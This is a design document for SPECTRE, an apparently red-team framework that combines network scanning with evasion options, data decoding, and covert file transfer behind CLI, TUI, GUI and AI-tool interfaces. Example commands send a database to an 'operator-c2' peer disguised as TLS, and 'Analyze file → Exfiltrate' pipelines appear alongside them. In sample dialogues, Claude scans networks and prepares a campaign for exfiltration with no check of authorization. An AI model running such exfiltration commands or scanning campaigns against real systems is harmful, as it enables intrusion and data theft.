# SPECTRE Interface Modes

**Version:** 0.1.0 | **Status:** Design Phase | **Last Updated:** 2026-02-04

---

## Overview

SPECTRE provides four distinct interaction methods, each optimized for different operational contexts and user preferences. All interfaces communicate with the same core orchestration layer, ensuring consistent behavior and data access.

| Mode    | Best For                                | Technology        | Status  |
| ------- | --------------------------------------- | ----------------- | ------- |
| **CLI** | Scripts, automation, CI/CD              | Rust (clap)       | Planned |
| **TUI** | Real-time operations, rapid interaction | Rust (ratatui)    | Planned |
| **GUI** | Visual planning, team collaboration     | Tauri 2.0 + React | Planned |
| **MCP** | AI-assisted operations                  | MCP Protocol      | Planned |

---

## CLI — Command Line Interface

### Purpose

The CLI is the primary interface for:

- Shell scripting and automation
- CI/CD pipeline integration
- Quick one-off operations
- Piping data between tools
- Remote/headless operation

### Command Structure

```text
spectre [OPTIONS] <COMMAND> [ARGS...]

COMMANDS:
    scan        Network scanning operations (ProRT-IP)
    chef        Data analysis operations (CyberChef)
    send        Secure file transfer (WRAITH)
    receive     Receive files (WRAITH)
    campaign    Campaign management
    workflow    Execute workflow definitions
    config      Configuration management
    status      System status and health
    help        Show help information

GLOBAL OPTIONS:
    -v, --verbose       Increase verbosity (-v, -vv, -vvv)
    -q, --quiet         Suppress non-error output
    --config <PATH>     Use alternate config file
    --output <FORMAT>   Output format (text, json, yaml, xml)
    -o, --output-file   Write output to file
    --no-color          Disable colored output
```

### Scan Subcommand (ProRT-IP)

```bash
spectre scan [OPTIONS] <TARGETS>

# Scan Types (mutually exclusive)
    -sS             SYN scan (default, requires privileges)
    -sT             Connect scan (no privileges needed)
    -sF             FIN scan
    -sN             NULL scan
    -sX             Xmas scan
    -sA             ACK scan (firewall detection)
    -sI <ZOMBIE>    Idle/zombie scan
    -sU             UDP scan

# Port Specification
    -p <PORTS>      Port ranges (e.g., 80,443,1-1000)
    -F              Fast scan (top 100 ports)
    --top-ports N   Scan top N common ports
    -p-             Scan all 65535 ports

# Detection
    -sV             Service version detection
    -O              OS detection
    -A              Aggressive (OS + service + scripts)
    --version-intensity <0-9>    Detection intensity

# Timing
    -T<0-5>         Timing template (0=paranoid, 5=insane)
    --rate <N>      Max packets per second
    --timeout <MS>  Probe timeout

# Evasion
    -f              Fragment packets
    --mtu <SIZE>    Custom MTU for fragmentation
    --ttl <N>       Set IP TTL
    -D <DECOYS>     Decoy scanning (RND:N or IP list)
    -g <PORT>       Source port spoofing

# Output
    -oN <FILE>      Normal text output
    -oX <FILE>      XML output (nmap-compatible)
    -oJ <FILE>      JSON output
    -oG <FILE>      Greppable output
    --pcap <FILE>   Packet capture (PCAPNG)

# Examples
spectre scan -sS -sV -p 1-1000 192.168.1.0/24
spectre scan -sS -T4 -oJ results.json 10.0.0.0/8
spectre scan -sU -p 53,161,123 --top-ports 100 targets.txt
```

### Chef Subcommand (CyberChef)

```bash
spectre chef [OPTIONS] <RECIPE> [--input <FILE|->]

# Recipe Specification
    <RECIPE>        Recipe string or name
                    "Op1,Op2,Op3" for inline
                    @recipe-name for saved recipe

# Input
    --input <PATH>  Input file (use - for stdin)
    -i <PATH>       Alias for --input

# Recipe Management
    --save <NAME>   Save current recipe
    --list          List saved recipes
    --show <NAME>   Show recipe details
    --delete <NAME> Delete saved recipe

# Output
    --output <PATH> Output file (default: stdout)
    -o <PATH>       Alias for --output
    --format <FMT>  Output format (text, hex, base64, json)

# Batch Mode
    --batch         Process input line by line
    --parallel      Parallel batch processing

# Examples
spectre chef "From_Base64,Gunzip" --input encoded.txt
spectre chef @decode-credentials --input creds.b64
echo "SGVsbG8gV29ybGQ=" | spectre chef "From_Base64"
spectre chef --list
spectre chef --save "my-recipe" "From_Hex,AES_Decrypt"
```

### Send/Receive Subcommands (WRAITH)

```bash
# Send file
spectre send [OPTIONS] <FILE> --peer <PEER_ID>

    --peer <ID>         Target peer ID or alias
    --encrypt           Enable encryption (default: on)
    --no-encrypt        Disable encryption
    --mimicry <TYPE>    Protocol mimicry (tls, websocket, doh)
    --compress          Enable compression
    --chunk-size <N>    Chunk size in KB

# Receive files
spectre receive [OPTIONS] --output <DIR>

    --output <DIR>      Output directory
    --accept-from <ID>  Only accept from specific peers
    --auto-accept       Auto-accept all transfers
    --timeout <SEC>     Receive timeout

# Examples
spectre send sensitive.db --peer operator-c2 --mimicry tls
spectre send report.pdf --peer @team-lead --compress
spectre receive --output ./downloads --auto-accept
```

### Campaign Subcommand

```bash
spectre campaign <SUBCOMMAND>

SUBCOMMANDS:
    new <NAME>      Create new campaign
    list            List campaigns
    show <NAME>     Show campaign details
    run <FILE>      Execute campaign definition
    status <NAME>   Check campaign status
    pause <NAME>    Pause active campaign
    resume <NAME>   Resume paused campaign
    abort <NAME>    Abort campaign
    export <NAME>   Export campaign data

# Examples
spectre campaign new "Operation BLACKOUT"
spectre campaign run red-team-op.yaml
spectre campaign status "Operation BLACKOUT"
spectre campaign export "Operation BLACKOUT" --format json
```

### Pipeline Examples

```bash
# Scan → Analyze → Report
spectre scan -sS -sV 10.0.0.0/24 -oJ - | \
  spectre chef "Extract_URLs,Defang_URL" | \
  spectre report --format markdown > findings.md

# Analyze file → Exfiltrate
spectre chef @deobfuscate-powershell --input malware.ps1 | \
  spectre send - --peer analyst-station

# Full campaign pipeline
spectre campaign run << 'EOF'
name: quick-recon
targets: 192.168.1.0/24
phases:
  - scan: -sS -sV -F
  - analyze: @extract-iocs
  - report: --format json
EOF
```

---

## TUI — Terminal User Interface

### Purpose

The TUI provides:

- Real-time operational dashboard
- Live scan progress visualization
- Multi-component status monitoring
- Keyboard-driven rapid operation
- Low-bandwidth remote operation

### Layout Structure

```text
┌─────────────────────────────────────────────────────────────────────────────────┐
│ SPECTRE v0.1.0                                    Campaign: Operation BLACKOUT  │
│ [F1] Help  [F2] Scan  [F3] Chef  [F4] Comms  [F5] Reports  [F10] Quit           │
├───────────────────────────────────────┬─────────────────────────────────────────┤
│           RECON PANEL                 │           ANALYSIS PANEL                │
│ ┌───────────────────────────────────┐ │ ┌─────────────────────────────────────┐ │
│ │ Target: 192.168.1.0/24            │ │ │ Recipe: @decode-credentials         │ │
│ │ Scan:   SYN + Service Detection   │ │ │ Input:  banners.txt (2.4 MB)        │ │
│ │                                   │ │ │ Status: Processing... 67%           │ │
│ │ Progress: ████████████░░░░ 75%    │ │ │                                     │ │
│ │ Rate:     45,231 pps              │ │ │ ████████████████░░░░░░░░ 67%        │ │
│ │ Hosts:    187 / 254               │ │ │                                     │ │
│ │ Ports:    1,247 open              │ │ │ Output Preview:                     │ │
│ │ Services: 89 identified           │ │ │ ─────────────────────────           │ │
│ │                                   │ │ │ admin:password123                   │ │
│ │ ┌─PORT───STATE──SERVICE─────────┐ │ │ │ root:toor                           │ │
│ │ │ 22    open   ssh 8.2p1        │ │ │ │ user:hunter2                        │ │
│ │ │ 80    open   nginx 1.18.0     │ │ │ │ ...                                 │ │
│ │ │ 443   open   nginx 1.18.0     │ │ │ └─────────────────────────────────────┘ │
│ │ │ 3306  open   mysql 8.0.23     │ │ └─────────────────────────────────────────┘
│ │ │ 8080  open   tomcat 9.0.41    │ │                                           │
│ │ └─────────────────────────────────┘ │                                         │
│ └───────────────────────────────────┘ │                                         │
├───────────────────────────────────────┼─────────────────────────────────────────┤
│           COMMS PANEL                 │           CAMPAIGN TIMELINE             │
│ ┌───────────────────────────────────┐ │ ┌─────────────────────────────────────┐ │
│ │ Identity: f3a9...c7b2             │ │ │ Phase: RECON                        │ │
│ │ Peers:    3 connected             │ │ │                                     │ │
│ │                                   │ │ │ 14:00 ▶ Campaign started           │ │
│ │ Active Channels:                  │ │ │ 14:05   Recon phase initiated       │ │
│ │ ┌─PEER────────PROTO──TX/RX──────┐ │ │ │ 14:15   187 hosts discovered        │ │
│ │ │ c2-server   TLS    1.2G/45M   │ │ │ │ 14:22   89 services identified      │ │
│ │ │ analyst-1   WS     200M/12M   │ │ │ │ 14:30   Analysis started            │ │
│ │ │ backup      DoH    50M/5M     │ │ │ │ 14:35 ◀ Current                    │ │
│ │ └─────────────────────────────────┘ │ │                                     │ │
│ │                                   │ │ │ Next: Exfiltration (pending)        │ │
│ │ Transfer Queue: 2 pending         │ │ └─────────────────────────────────────┘ │
│ └───────────────────────────────────┘ │                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│ [s]can [a]nalyze [t]ransfer [r]eport │ Status: GREEN │ CPU: 23% │ MEM: 1.2GB    │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Keyboard Shortcuts

| Key         | Action                     | Context   |
| ----------- | -------------------------- | --------- |
| `F1`        | Show help overlay          | Global    |
| `F2`        | Switch to Scan panel       | Global    |
| `F3`        | Switch to Chef panel       | Global    |
| `F4`        | Switch to Comms panel      | Global    |
| `F5`        | Switch to Reports panel    | Global    |
| `F10` / `q` | Quit application           | Global    |
| `Tab`       | Cycle focus between panels | Global    |
| `Enter`     | Activate/select item       | Any panel |
| `Esc`       | Cancel/back                | Any panel |
| `/`         | Command palette            | Global    |
| `:`         | Command mode               | Global    |

**Scan Panel:**

| Key   | Action            |
| ----- | ----------------- |
| `s`   | Start new scan    |
| `p`   | Pause/resume scan |
| `x`   | Stop scan         |
| `f`   | Filter results    |
| `e`   | Export results    |
| `j/k` | Navigate results  |

**Chef Panel:**

| Key     | Action            |
| ------- | ----------------- |
| `r`     | Select recipe     |
| `i`     | Select input file |
| `Enter` | Execute recipe    |
| `c`     | Clear output      |
| `s`     | Save output       |

**Comms Panel:**

| Key | Action          |
| --- | --------------- |
| `c` | Connect to peer |
| `d` | Disconnect peer |
| `t` | Start transfer  |
| `l` | List peers      |

### Command Mode

Press `:` to enter command mode (vim-style):

```
:scan 192.168.1.0/24 -sS -p 1-1000
:chef @decode-credentials input.txt
:send report.pdf @c2-server
:campaign run red-team.yaml
:set theme=dark
:quit
```

### Themes

```toml
# ~/.config/spectre/themes/tactical.toml
[colors]
background = "#0a0a0a"
foreground = "#00ff00"
accent = "#ff6600"
success = "#00ff00"
warning = "#ffff00"
error = "#ff0000"

[borders]
style = "double"
color = "#333333"

[widgets]
progress_filled = "█"
progress_empty = "░"
```

---

## GUI — Graphical User Interface

### Purpose

The GUI provides:

- Visual campaign planning workspace
- Network topology visualization
- Drag-and-drop workflow builder
- Multi-operator collaboration
- Rich reporting with exports

### Technology Stack

- **Framework:** Tauri 2.0
- **Frontend:** React 18, TypeScript, Tailwind CSS
- **State:** Zustand
- **UI Components:** shadcn/ui
- **Visualization:** D3.js (network graphs), Recharts (metrics)

### Main Workspace

```text
┌────────────────────────────────────────────────────────────────────────────────┐
│ ☰ SPECTRE                                        [👤 Operator 1] [🔔 3] [⚙️]  │
├────────────────────────────────────────────────────────────────────────────────┤
│ ┌─────────────────────────────────────────────────────────────────────────────┐│
│ │ Campaign: Operation BLACKOUT          Phase: RECON ▸ ANALYSIS               ││
│ │ Status: ACTIVE    Started: 14:00    Duration: 2h 35m    Targets: 254        ││
│ └─────────────────────────────────────────────────────────────────────────────┘│
├──────────────┬─────────────────────────────────────────────────────────────────┤
│              │                                                                 │
│  NAVIGATION  │                    MAIN WORKSPACE                               │
│              │                                                                 │
│  📊 Dashboard│   ┌──────────────────────────────────────────────────────────┐  │
│  🎯 Targets  │   │                                                          │  │
│  🔍 Recon    │   │              NETWORK TOPOLOGY VIEW                       │  │
│  🧪 Analysis │   │                                                          │  │
│  📡 Comms    │   │           ○──────○                                       │  │
│  📋 Reports  │   │          /│\    /│\                                      │  │
│  ⚙️ Settings │   │         ○ ○ ○  ○ ○ ○    Legend:                          │  │
│              │   │         │ │ │  │ │ │    ● Web Server                     │  │
│  ─────────── │   │         ● ● ○  ○ ● ○    ○ Database                       │  │
│              │   │                         ◆ Critical                      │  │
│  CAMPAIGNS   │   │                                                          │  │
│  ▸ BLACKOUT  │   └──────────────────────────────────────────────────────────┘  │
│    NIGHTFALL │                                                                 │
│    PHANTOM   │   ┌────────────────────────┬─────────────────────────────────┐  │
│              │   │ SCAN PROGRESS          │ FINDINGS                        │  │
│              │   │ ████████████░░ 78%     │ 12 Critical  ◆◆◆◆           │  │
│              │   │ 198/254 hosts          │ 34 High      ●●●●●●             │  │
│              │   │ Rate: 45K pps          │ 89 Medium    ○○○○○○○○           │  │
│              │   └────────────────────────┴─────────────────────────────────┘  │
│              │                                                                 │
└──────────────┴─────────────────────────────────────────────────────────────────┘
```

### Workflow Builder

Drag-and-drop interface for creating complex workflows:

```text
┌────────────────────────────────────────────────────────────────────────────────┐
│ Workflow Builder: red-team-recon                               [Save] [Run]    │
├────────────────────────────────────────────────────────────────────────────────┤
│ COMPONENTS          │                      CANVAS                              │
│ ──────────────────  │  ┌─────────────────────────────────────────────────────┐ │
│ 📦 Scan             │  │                                                     │ │
│   ├ SYN Scan        │  │    ┌─────────┐     ┌─────────┐      ┌─────────┐     │ │
│   ├ Service Detect  │  │    │  SYN    │───▶│ Service │────▶│ Extract │     │ │
│   └ OS Detect       │  │    │  Scan   │     │ Detect  │      │ Banners │     │ │
│                     │  │    └─────────┘     └─────────┘      └────┬────┘     │ │
│ 📦 Analyze          │  │                                          │          │ │
│   ├ Extract URLs    │  │                                          ▼          │ │
│   ├ Decode Base64   │  │                               ┌─────────────┐       │ │
│   └ Find Patterns   │  │                               │   Decode    │       │ │
│                     │  │                               │   Base64    │       │ │
│ 📦 Transfer         │  │                               └──────┬──────┘       │ │
│   ├ Send File       │  │                                      │              │ │
│   └ Receive File    │  │                                      ▼              │ │
│                     │  │                               ┌─────────────┐       │ │
│ 📦 Report           │  │                               │   Send to   │       │ │
│   ├ Generate PDF    │  │                               │   C2 Server │       │ │
│   └ Export JSON     │  │                               └─────────────┘       │ │
│                     │  │                                                     │ │
│                     │  └─────────────────────────────────────────────────────┘ │
└─────────────────────┴──────────────────────────────────────────────────────────┘
```

### Features

**Campaign Dashboard:**

- Real-time metrics and statistics
- Phase progress visualization
- Timeline of events
- Alert notifications

**Target Management:**

- Import targets from files
- Manual entry and CIDR parsing
- Tagging and categorization
- Scope management

**Network Visualization:**

- Interactive topology graph
- Zoom, pan, filter
- Node details on click
- Export as SVG/PNG

**Report Generation:**

- Multiple templates (executive, technical, compliance)
- Export formats: PDF, HTML, DOCX, JSON
- Custom branding
- Finding evidence attachment

**Collaboration:**

- Multi-operator support
- Real-time cursor presence
- Chat/comments on findings
- Role-based permissions

---

## MCP Server — AI-Assisted Operations

### Purpose

The MCP Server enables:

- AI-assisted security operations
- Natural language command translation
- Intelligent workflow suggestions
- Integration with Claude, Cursor, and other MCP clients

### MCP Protocol

SPECTRE implements the [Model Context Protocol](https://modelcontextprotocol.io/) specification with stdio transport.

**Server Initialization:**

```json
{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": "2024-11-05",
        "capabilities": {
            "tools": {}
        },
        "clientInfo": {
            "name": "claude-code",
            "version": "1.0.0"
        }
    }
}
```

### Tool Categories

#### Scan Tools (spectre*scan*\*)

| Tool                   | Description      | Parameters                   |
| ---------------------- | ---------------- | ---------------------------- |
| `spectre_scan_syn`     | TCP SYN scan     | target, ports, rate, timeout |
| `spectre_scan_connect` | TCP Connect scan | target, ports, timeout       |
| `spectre_scan_fin`     | TCP FIN scan     | target, ports                |
| `spectre_scan_null`    | TCP NULL scan    | target, ports                |
| `spectre_scan_xmas`    | TCP Xmas scan    | target, ports                |
| `spectre_scan_ack`     | TCP ACK scan     | target, ports                |
| `spectre_scan_idle`    | Idle/Zombie scan | target, zombie, ports        |
| `spectre_scan_udp`     | UDP scan         | target, ports                |

**Example:**

```json
{
    "name": "spectre_scan_syn",
    "arguments": {
        "target": "192.168.1.0/24",
        "ports": "1-1000",
        "rate": 10000,
        "service_detection": true
    }
}
```

#### Detection Tools (spectre*detect*\*)

| Tool                     | Description               | Parameters       |
| ------------------------ | ------------------------- | ---------------- |
| `spectre_detect_service` | Service version detection | hosts, intensity |
| `spectre_detect_os`      | OS fingerprinting         | hosts            |
| `spectre_detect_tls`     | TLS certificate analysis  | hosts            |
| `spectre_detect_banner`  | Banner grabbing           | hosts, ports     |

#### Chef Tools (spectre*chef*\*)

All 463 CyberChef operations are exposed as individual tools:

| Tool                        | Description            |
| --------------------------- | ---------------------- |
| `spectre_chef_bake`         | Execute full recipe    |
| `spectre_chef_from_base64`  | Decode Base64          |
| `spectre_chef_to_base64`    | Encode Base64          |
| `spectre_chef_aes_decrypt`  | AES decryption         |
| `spectre_chef_gunzip`       | Gzip decompression     |
| `spectre_chef_extract_urls` | Extract URLs           |
| ...                         | (463 operations total) |

#### Transfer Tools (spectre*transfer*\*)

| Tool                          | Description          | Parameters          |
| ----------------------------- | -------------------- | ------------------- |
| `spectre_transfer_send`       | Send file securely   | file, peer, options |
| `spectre_transfer_receive`    | Receive files        | output_dir, options |
| `spectre_transfer_list_peers` | List connected peers | -                   |
| `spectre_transfer_connect`    | Connect to peer      | peer_id             |

#### Campaign Tools (spectre*campaign*\*)

| Tool                      | Description          | Parameters          |
| ------------------------- | -------------------- | ------------------- |
| `spectre_campaign_create` | Create new campaign  | name, description   |
| `spectre_campaign_run`    | Execute campaign     | definition          |
| `spectre_campaign_status` | Get campaign status  | campaign_id         |
| `spectre_campaign_pause`  | Pause campaign       | campaign_id         |
| `spectre_campaign_resume` | Resume campaign      | campaign_id         |
| `spectre_campaign_abort`  | Abort campaign       | campaign_id         |
| `spectre_campaign_export` | Export campaign data | campaign_id, format |
| `spectre_campaign_list`   | List all campaigns   | -                   |

### Client Configuration

**Claude Code (claude_desktop_config.json):**

```json
{
    "mcpServers": {
        "spectre": {
            "command": "spectre-mcp",
            "args": ["serve"],
            "env": {
                "SPECTRE_CONFIG": "/path/to/spectre.toml"
            }
        }
    }
}
```

**Cursor (MCP settings):**

```json
{
    "name": "SPECTRE",
    "type": "command",
    "command": "spectre-mcp",
    "args": ["serve"]
}
```

### AI Workflow Examples

**Example 1: Network Reconnaissance**

```
User: "Scan the 10.0.0.0/24 network for web servers and identify any
       outdated Apache or nginx versions"

Claude: I'll perform a targeted scan for web servers and check versions:

1. spectre_scan_syn({
     target: "10.0.0.0/24",
     ports: "80,443,8080,8443",
     service_detection: true
   })

2. [Analyze results for Apache/nginx services]

3. Report findings with version comparison against known CVEs.

Results:
- 10.0.0.15: nginx 1.14.0 (outdated - CVE-2019-20372)
- 10.0.0.23: Apache 2.4.29 (outdated - multiple CVEs)
- 10.0.0.45: nginx 1.21.6 (current)
```

**Example 2: Data Analysis Pipeline**

```
User: "I have a file with Base64-encoded, gzipped JSON data. Extract all
       IP addresses and URLs from it."

Claude: I'll create a decoding and extraction pipeline:

1. spectre_chef_from_base64({ input: <file_contents> })
2. spectre_chef_gunzip({ input: <decoded> })
3. spectre_chef_extract_ip_addresses({ input: <json_text> })
4. spectre_chef_extract_urls({ input: <json_text> })

Extracted IOCs:
IPs: 192.168.1.100, 10.0.0.50, 203.0.113.42
URLs: https://malicious.example.com/payload, http://c2.evil.net/beacon
```

**Example 3: Campaign Orchestration**

```
User: "Create a red team campaign targeting the DMZ network with
       reconnaissance, analyze findings, and prepare for exfiltration"

Claude: I'll set up a structured campaign:

1. spectre_campaign_create({
     name: "Operation DMZ-RECON",
     description: "DMZ network reconnaissance and analysis"
   })

2. Define workflow phases:
   - Phase 1: Network scan with service detection
   - Phase 2: Banner analysis and IOC extraction
   - Phase 3: Prepare findings for secure transfer

3. spectre_campaign_run({ definition: <workflow> })

Campaign created and initiated. Current status: RECON phase
Progress: 45% | Hosts: 127/254 | Services: 89 identified
```

### Security Considerations

**Tool Access Control:**

- MCP server runs with user privileges
- Scan operations require cap_net_raw capability
- Transfer operations require valid peer authentication

**Input Validation:**

- All tool inputs validated against schemas
- Target specifications sanitized
- File paths restricted to configured directories

**Audit Logging:**

- All MCP tool calls logged
- Request/response correlation IDs
- Timestamp and client identification

---

## Interface Comparison

| Feature              | CLI | TUI | GUI | MCP |
| -------------------- | --- | --- | --- | --- |
| Scripting/Automation | ★★★ | ★   | ★   | ★★★ |
| Real-time Monitoring | ★   | ★★★ | ★★  | ★   |
| Visual Analysis      | ★   | ★★  | ★★★ | ★   |
| Collaboration        | ★   | ★   | ★★★ | ★   |
| AI Assistance        | ★   | ★   | ★★  | ★★★ |
| Low Bandwidth        | ★★★ | ★★  | ★   | ★★★ |
| Learning Curve       | ★★  | ★★  | ★★★ | ★★★ |
| Power User           | ★★★ | ★★★ | ★★  | ★★★ |

---

## References

- [SYSTEM-DESIGN.md](SYSTEM-DESIGN.md) — Overall system architecture
- [INTEGRATION-SPEC.md](INTEGRATION-SPEC.md) — Component integration details
- [CLI-REFERENCE.md](../user-guide/CLI-REFERENCE.md) — Complete CLI documentation
- [TUI-GUIDE.md](../user-guide/TUI-GUIDE.md) — TUI user guide
- [MCP-TOOLS.md](../user-guide/MCP-TOOLS.md) — MCP tool reference
